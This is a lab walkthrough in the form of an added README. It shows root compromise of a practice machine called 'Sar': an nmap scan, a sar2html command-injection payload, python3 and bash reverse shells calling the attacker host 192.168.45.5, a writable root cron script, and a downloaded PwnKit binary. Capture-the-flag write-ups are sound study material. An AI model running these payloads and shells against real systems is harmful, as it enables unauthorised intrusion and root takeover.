@@ -1,0 +1,133 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>README.md</title>
+</head><body><br/>
+IP - 192.168.206.35<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+nmap result<br/>
+<br/>
+┌──(root㉿kali)-[~/Desktop/offensive_security_playground/Sar]<br/>
+└─# nmap -sC -sV 192.168.206.35 -p- -oN nmap_all_port.txt<br/>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-23 03:01 +0630<br/>
+Stats: 0:03:47 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan<br/>
+SYN Stealth Scan Timing: About 40.88% done; ETC: 03:10 (0:05:25 remaining)<br/>
+Nmap scan report for 192.168.206.35<br/>
+Host is up (0.29s latency).<br/>
+Not shown: 65533 closed tcp ports (reset)<br/>
+PORT &nbsp; STATE SERVICE VERSION<br/>
+22/tcp open &nbsp;ssh &nbsp; &nbsp; OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br/>
+| ssh-hostkey: <br/>
+| &nbsp; 2048 3340be13cf517dd6a59c64c813e5f29f (RSA)<br/>
+| &nbsp; 256 8a4eab0bdee3694050989858328f719e (ECDSA)<br/>
+|_ &nbsp;256 e62f551cdbd0bb469280dd5f8ea30a41 (ED25519)<br/>
+80/tcp open &nbsp;http &nbsp; &nbsp;Apache httpd 2.4.29 ((Ubuntu))<br/>
+|_http-title: Apache2 Ubuntu Default Page: It works<br/>
+|_http-server-header: Apache/2.4.29 (Ubuntu)<br/>
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br/>
+<br/>
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br/>
+Nmap done: 1 IP address (1 host up) scanned in 638.95 seconds<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+I found Juciy directory in robots.txt<br/>
+<br/>
+http://192.168.206.35/robots.txt<br/>
+<br/>
+sar2HTML<br/>
+<br/>
+I go to sar2HTML directory and found sar2html Ver 3.2.1 webpage. I research about sar2html Ver 3.2.1 and found RCE exploit.<br/>
+<br/>
+https://www.exploit-db.com/exploits/47204<br/>
+<br/>
+payload - index.php?plot=;whoami<br/>
+<br/>
+after executing the payload www-data will shown in "Select Host" bottom side of the drop down list.<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Reverse Shell<br/>
+<br/>
+I got reverse shell with python3 reverse shell payload.<br/>
+<br/>
+payload - http://192.168.206.35/sar2HTML/index.php?plot=;python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.45.5%22,4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22sh%22)%27<br/>
+<br/>
+python3 reverse shell - python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+1st Flag<br/>
+<br/>
+www-data@sar:/home$ cat local.txt <br/>
+b4e473b8489370aae180c4d188550fb3<br/>
+<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Privilege Escalation<br/>
+<br/>
+After running linpeas I found crontab that run bash file in every 5 mins as root:<br/>
+<br/>
+*/5 &nbsp;* &nbsp; &nbsp;* * * &nbsp; root &nbsp; &nbsp;cd /var/www/html/ &amp;&amp; sudo ./finally.sh<br/>
+<br/>
+<br/>
+So, I read the bash file and inside bash file that run another bash file called write.sh that file also writable so I edited with bash reverse shell (bash -i &gt;&amp; /dev/tcp/192.168.45.5/5555 0&gt;&amp;1)<br/>
+<br/>
+-rwxrwxrwx 1 www-data www-data &nbsp; &nbsp;56 Feb 23 02:32 write.sh<br/>
+<br/>
+And then wait 5 minutes, Boom! I got new reverse shell as root.<br/>
+<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# nc -lvnp 5555 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+listening on [any] 5555 ...<br/>
+connect to [192.168.45.5] from (UNKNOWN) [192.168.206.35] 45896<br/>
+bash: cannot set terminal process group (15948): Inappropriate ioctl for device<br/>
+bash: no job control in this shell<br/>
+root@sar:/var/www/html# whoami<br/>
+whoami<br/>
+root<br/>
+<br/>
+2nd Flag:<br/>
+<br/>
+root@sar:~# cat proof.txt<br/>
+cat proof.txt<br/>
+14f6818fe893220ef7f32c41cc1a42f3<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Another Way to Privilege Escalation (Kernel Exploit PwnKit)<br/>
+<br/>
+<br/>
+Step 1:<br/>
+<br/>
+I transfer PwnKit that already gcc complie in my machine. (Transfer with python server)<br/>
+<br/>
+┌──(root㉿kali)-[~/Desktop/tools/Pwnkit]<br/>
+└─# python2 -m SimpleHTTPServer 80<br/>
+Serving HTTP on 0.0.0.0 port 80 ...<br/>
+192.168.206.35 - - [23/Feb/2023 03:39:03] "GET /PwnKit HTTP/1.1" 200 -<br/>
+<br/>
+Step 2:<br/>
+<br/>
+Download in victim machine and exploit it.<br/>
+<br/>
+www-data@sar:/tmp$ wget http://192.168.45.5/PwnKit<br/>
+--2023-02-23 02:39:04-- &nbsp;http://192.168.45.5/PwnKit &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+Connecting to 192.168.45.5:80... connected.<br/>
+HTTP request sent, awaiting response... 200 OK<br/>
+Length: 16800 (16K) [application/octet-stream]<br/>
+Saving to: 'PwnKit'<br/>
+<br/>
+PwnKit &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;100%[===================&gt;] &nbsp;16.41K &nbsp;56.2KB/s &nbsp; &nbsp;in 0.3s &nbsp; &nbsp;<br/>
+<br/>
+2023-02-23 02:39:05 (56.2 KB/s) - 'PwnKit' saved [16800/16800]<br/>
+<br/>
+www-data@sar:/tmp$ chmod +x PwnKit <br/>
+www-data@sar:/tmp$ ./PwnKit <br/>
+root@sar:/tmp# whoami<br/>
+root<br/>
+</body></html>
